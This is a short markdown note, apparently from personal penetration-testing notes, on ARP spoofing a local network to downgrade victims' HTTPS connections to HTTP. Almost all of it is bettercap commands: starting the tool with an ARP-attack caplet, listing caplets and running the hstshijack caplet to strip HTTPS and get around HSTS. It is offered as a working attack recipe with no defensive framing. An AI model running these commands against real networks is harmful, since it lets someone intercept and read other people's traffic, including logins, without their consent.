# Arp-Spoofing for HTTPS

## Downgrade HTTPS to HTTP

```bash
bettercap -iface eth0 -caplet https_arp_attack.cap
```

```bash
help
```
Make sure they are on, running:

![image](https://github.com/user-attachments/assets/787dd6e8-5321-4e7d-875a-15eb0ee8262b)


Show caplets:

```bash
caplets.show
```

Run hstshijack/hstshijack caplet:

```bash
hstshijack/hstshijack
```


